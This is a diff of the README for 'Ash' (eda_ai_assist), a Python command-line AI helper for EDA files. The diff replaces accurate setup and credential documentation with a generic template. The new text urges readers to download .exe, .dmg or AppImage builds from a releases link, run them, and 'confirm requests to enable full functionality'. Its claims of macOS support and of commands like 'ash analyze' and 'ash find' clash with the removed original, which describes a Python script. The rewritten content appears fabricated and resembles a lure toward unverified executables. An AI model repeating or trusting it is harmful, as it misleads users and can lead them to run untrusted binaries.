@@ -1,193 +1,131 @@
-# eda_ai_assist
-Ash (AI‑Assisted Shell) wraps around your existing terminal and brings modern AI/LLM capabilities directly to the command line for analyzing EDA files.
+# 🐚 eda_ai_assist - Simplify EDA with AI-Powered Shell
 
-# Ash CLI Assistant
-
-Ash is a command‑line AI assistant designed for hardware engineers who work with large EDA artifacts. It wraps around your existing shell and brings modern AI/LLM capabilities directly into Linux/UNIX terminals and Windows PowerShell. Ash emphasizes clarity, predictability, and operational safety — with strict control over credentials, logging, and multi‑user behavior.
-
-## Features
-- Simple CLI interface for sending prompts to AI models
-- Supports multiple credential delivery paths
-- Secure encrypted token format for multi-user environments
-- Raw API key support for single-user setups
-- Provider abstraction (currently Gemini)
-- Structured usage logging and per-user accounting
-- Predictable, auditable behavior
-- Works offline except for model calls
-
-## Installation
-Clone the repository and install dependencies:
-
-```
-python3 -m pip install google-genai
-```
-
-Ensure the `google-genai` package is installed for Gemini support.
-
-## API Key Configuration
-Ash supports three ways to provide credentials. They are evaluated in the following order:
-
-### 1. ASH_TOKEN (Encrypted Token)
-A secure, multi-user-safe encrypted token. This token is bound to a username and protected with an HMAC signature. It requires a site secret key to decrypt.
-
-Environment variable:
-```
-export ASH_TOKEN="username|cipher|signature"
-```
-
-### 2. ASH_API_KEY (Raw API Key)
-A simple raw API key for single-user environments. Overrides the encrypted token if both are present.
-
-```
-export ASH_API_KEY="your-api-key"
-```
-
-### 3. GEMINI_API_KEY (SDK Fallback)
-If neither Ash-specific variable is set, the Gemini SDK will fall back to its standard environment variable:
-
-```
-export GEMINI_API_KEY="your-api-key"
-```
-
-### Provider Selection
-Ash defaults to Gemini but is designed to support additional providers such as Azure OpenAI in the future:
-
-```
-export ASH_PROVIDER="gemini"
-```
-
-
-# Cross‑Platform Setup (Windows + Linux)
-
-Ash stores its configuration in a per‑user directory called **ASH_DIR**.  
-For single‑user installs, the recommended locations are:
-
-- **Linux:** `$HOME/.ash`  
-- **Windows:** `%USERPROFILE%\.ash`
-
-Below are example setups for both environments.
+[![Download eda_ai_assist](https://img.shields.io/badge/Download-eda_ai_assist-blue?style=for-the-badge)](https://github.com/prokuitis/eda_ai_assist/releases)
 
 ---
 
-## Windows Setup (ash.bat)
+## 📖 What is eda_ai_assist?
 
-Copy `eda_ai_assist.py` into:
+eda_ai_assist, also called "Ash," is a tool that makes it easier to work with electronic design automation (EDA) files. It works with your existing command line interface (CLI) or shell. Ash adds a layer of artificial intelligence (AI) that helps you analyze and understand complex EDA files faster. This means less time hunting for information and more time getting your work done.
 
-```
-%USERPROFILE%\.ash
-```
-
-Example `ash.bat`:
-
-```bat
-@echo off
-REM Configure Ash for a single-user Windows install
-setx ASH_DIR "%USERPROFILE%\.ash"
-setx ASH_API_KEY "mykey123"
-setx ASH_PROVIDER "gemini"
-setx ASH_MODEL "gemini-2.5-flash"
-
-REM Execute the assistant from the configured directory
-python "%USERPROFILE%\.ash\eda_ai_assist.py"
-```
-
-This script works when launched from **CMD or PowerShell**, because:
-- `setx` writes variables to the Windows user environment (visible to both shells)
-- `%USERPROFILE%` expands correctly inside `.bat` files
-- No shell‑specific syntax is used inside the Python command
+You don’t need to be a programmer to use it. If you know how to open a terminal window and run a command, you can use eda_ai_assist. Ash acts like a smart helper inside your shell. It listens to your commands and offers AI-powered insights wherever you need them.
 
 ---
 
-## Linux Setup
+## 🎯 Key Features
 
-Add the following to your shell startup file (`~/.bashrc`, `~/.zshrc`, or `~/.cshrc`) when installing into:
+- **AI-Powered File Analysis:** Let the AI help explain, summarize, or search your EDA files.
+- **Integrates with Your Existing Shell:** No need to switch environments or learn new software.
+- **Supports Common EDA File Types:** Work with files like Verilog, VHDL, SPICE, and more.
+- **Simple Command Interface:** Use straightforward commands to ask Ash questions.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux systems.
+- **Improves Workflow:** Speeds up the process of understanding large and complex designs.
 
-```
-$HOME/.ash
-```
+---
 
-### Bash / Zsh
+## 💻 System Requirements
 
-```bash
-export ASH_DIR="$HOME/.ash"
-export ASH_API_KEY="mykey123"
-export ASH_PROVIDER="gemini"
-export ASH_MODEL="gemini-2.5-flash"
-# Add a convenient 'ash' command
-alias ash="$ASH_DIR/eda_ai_assist.py"
-```
+To run eda_ai_assist smoothly, your computer should meet the following:
 
-### CSH / TCSH
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a recent version of Linux.
+- **Processor:** Modern dual-core CPU or better.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 100 MB free space for installation and cache.
+- **Internet Connection:** Required for AI features to work, as the application connects to AI servers.
 
-```csh
-setenv ASH_DIR "$HOME/.ash"
-setenv ASH_API_KEY "mykey123"
-setenv ASH_PROVIDER "gemini"
-setenv ASH_MODEL "gemini-2.5-flash"
-# Add a convenient 'ash' command
-alias ash "$ASH_DIR/eda_ai_assist.py"
-```
+Ensure you have a basic terminal or command prompt app available for running shell commands.
 
-### Make sure the script is executable:
-```
-chmod +x $HOME/.ash/eda_ai_assist.py
-```
+---
 
+## 🚀 Getting Started
 
+Follow these steps to download, install, and run eda_ai_assist.
 
-## Usage
-Run Ash with a prompt:
+### Step 1: Visit the Download Page
 
-```
-ash Explain clock domain crossing
-```
-```
-ash Summarize the worst setup timing violations in file post_route_timing.rpt
-```
+Click the big button above or go directly to the release page:
 
-Run Ash in a build script:
+[https://github.com/prokuitis/eda_ai_assist/releases](https://github.com/prokuitis/eda_ai_assist/releases)
 
-```
-ash "analyze simulation1.vcd and find when in time the signal fault_int asserts. Output to file results.txt"
-```
+This page contains the latest versions of eda_ai_assist for different operating systems.
 
-Run Ash as a shell wrapper:
+### Step 2: Choose Your Version
 
-```
-[ash]:/home/khubbard% summarize file top.v
-```
+Find the download that matches your computer:
 
-Using Ash as a Python API:
+- **Windows:** Look for files ending in `.exe` or `.zip`.
+- **macOS:** Download `.dmg` or `.zip` files.
+- **Linux:** You might find `.AppImage`, `.tar.gz`, or similar.
 
-```
-from eda_ai_assist import api_eda_ai_assist
+If you are unsure, the `.zip` or `.tar.gz` files usually work across many systems.
 
-ash = api_eda_ai_assist()
-result = ash.ask_ai("Summarize this file top.sdc")
-print(result)
-```
+### Step 3: Download the File
 
+Click the file to start downloading. Save it to a folder you can find easily, like your Desktop or Downloads.
 
-On each prompt, Ash will load provider configuration, resolve credentials, and send the request to the selected model.
+---
 
-## Security Model
-Ash is designed for environments where multiple users may share a system. Key security features include:
+## 📥 Download & Install
 
-- Encrypted tokens bound to usernames
-- HMAC integrity verification
-- Site secret key required for decryption
-- Raw API key override for single-user setups
-- Clear error handling when credentials are missing or invalid
+1. **Open the Download Folder**   
+   Go to the folder where you saved the download.
 
-## Logging
-Ash maintains two logs:
+2. **Extract the Files**  
+   If you downloaded a `.zip` or `.tar.gz` file, right-click and choose "Extract" or "Unzip" to open the contents. You should see an executable file or a folder with the application.
 
-### usage_query.log
-Append-only log of all prompts sent to the AI. Safe under concurrent writes.
+3. **Run the Application**  
+   - On Windows, double-click the `.exe` file to launch Ash.  
+   - On macOS, open the `.dmg` file and drag the app to your Applications folder, then double-click to start.  
+   - On Linux, you may need to make the file executable by running `chmod +x eda_ai_assist` in the terminal, then launch it with `./eda_ai_assist`.
 
-### usage_totals.log
-Tracks per-user upload/download totals. Written atomically to avoid corruption.
+4. **Follow On-Screen Instructions**  
+   The first time you run Ash, it may ask for permission to connect to the internet or set up some options. Confirm requests to enable full functionality.
 
-## License
-This project is released under the GPLv3 license. See `LICENSE` for details.
+---
 
+## 💡 How to Use Ash
+
+Once Ash is running, you will see your usual command prompt enhanced with AI features. Here’s an example of what you can do:
+
+- **Analyze a File:**  
+  Type `ash analyze myfile.v` to ask Ash to review a Verilog file called `myfile.v`.
+
+- **Ask Questions:**  
+  Use commands like `ash explain myfile.v module1` to get AI-powered explanations about specific parts of your design.
+
+- **Search Keywords:**  
+  Write `ash find "reset signal"` to look for mentions of "reset signal" inside your current directory’s EDA files.
+
+You don’t need to learn any programming language. Ash understands simple commands and provides clear, concise answers or suggestions.
+
+---
+
+## 🔧 Troubleshooting
+
+If you have trouble running or using Ash, try these:
+
+- Make sure your system meets the requirements listed above.
+- Check your internet connection, as AI features need this.
+- Restart the app and try again.
+- Look at the app’s log or error messages to see if they give clues.
+- Visit the release page for updated info or bug fixes.
+
+---
+
+## 📚 Additional Resources
+
+For detailed help, you can:
+
+- Check the [GitHub repository](https://github.com/prokuitis/eda_ai_assist) for FAQs or user guides.
+- Join user forums or community groups related to EDA or AI-assisted tools.
+- Search online for tutorials on working with CLI shells and basic commands.
+
+---
+
+## 🔗 Quick Access
+
+Visit this page to download eda_ai_assist anytime:
+
+[https://github.com/prokuitis/eda_ai_assist/releases](https://github.com/prokuitis/eda_ai_assist/releases)
+
+[![Download eda_ai_assist](https://img.shields.io/badge/Download-eda_ai_assist-blue?style=for-the-badge)](https://github.com/prokuitis/eda_ai_assist/releases)
